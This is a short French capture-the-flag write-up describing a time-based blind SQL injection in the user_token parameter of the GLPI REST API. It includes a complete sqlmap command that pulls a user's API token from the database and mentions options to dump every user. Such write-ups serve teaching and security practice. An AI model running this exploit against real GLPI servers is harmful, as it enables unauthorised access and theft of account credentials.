---
title: "GLPI Again"
date: 2023-06-13T09:03:20-08:00
draft: false
---


# OpenCycom 2023 - GLPIAgain - *200 pts*

## Challenge

La cible dispose d'une plateforme GLPI exposée sur internet. GLPI comprend une importante dette technique et a souvent été impacté par de nombreuses vulnérabilités. Ici l'énoncé indiquait que l'objectif était de récupérer la clef API du compte `glpi`, comment l'obtenir sans identifiants, en blackbox ?

## Vulnérabilités

Une vulnérabilité relativement récente est présente sur la plateforme si l'API est activée et exposée. D'où l'indice que l'objectif est de récupérer la clef API.
Une injection SQL aveugle basée sur le timing est présente sur le paramètre `user_token`.


## Exploit

L'exploitation peut être entièrement automatisée par SQLmap :
```bash
sqlmap --dbms=mysql --technique=T --ignore-code=401  -u 'https://glpi/apirest.php/initSession?user_token=xxxxxx' -p user_token --sql-query='select api_token from glpi_users where id=2;'
```
Ici une requête SQL est directement passée, mais obtenir petit à petit la liste des tous les utilisateurs est également possible, en utilisant les différentes options, `--dump`, `--tables` etc.
